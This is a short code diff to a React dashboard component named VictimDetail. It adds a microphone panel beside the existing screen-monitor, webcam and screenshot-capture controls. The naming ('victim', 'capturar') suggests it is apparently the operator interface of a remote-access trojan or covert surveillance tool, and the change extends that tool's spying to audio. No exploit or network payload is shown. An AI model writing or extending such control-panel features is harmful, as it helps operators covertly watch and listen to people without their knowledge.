@@ -21,6 +21,7 @@ import { EventFeed } from '@/components/event-feed';
 import { ChatPanel } from '@/components/chat-panel';
 import { MonitorPanel } from '@/components/monitor-panel';
 import { WebcamPanel } from '@/components/webcam-panel';
+import { MicPanel } from '@/components/mic-panel';
 import { TimelinePanel } from '@/components/timeline-panel';
 import { cn } from '@/lib/cn';
 import { humanError } from '@/lib/errors';
@@ -393,6 +394,7 @@ export function VictimDetail({
           <TabsContent value="monitor" className="mt-0">
             <MonitorPanel victim={victim} />
             <div className="mt-3"><WebcamPanel victim={victim} /></div>
+            <div className="mt-3"><MicPanel victim={victim} /></div>
             <div className="mb-2 mt-3 flex items-center justify-between border-t border-line pt-2">
               <p className="text-2xs uppercase tracking-wide text-muted">Capturas</p>
               <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('screenshot')}><Monitor className="h-3 w-3" /> capturar</Button>
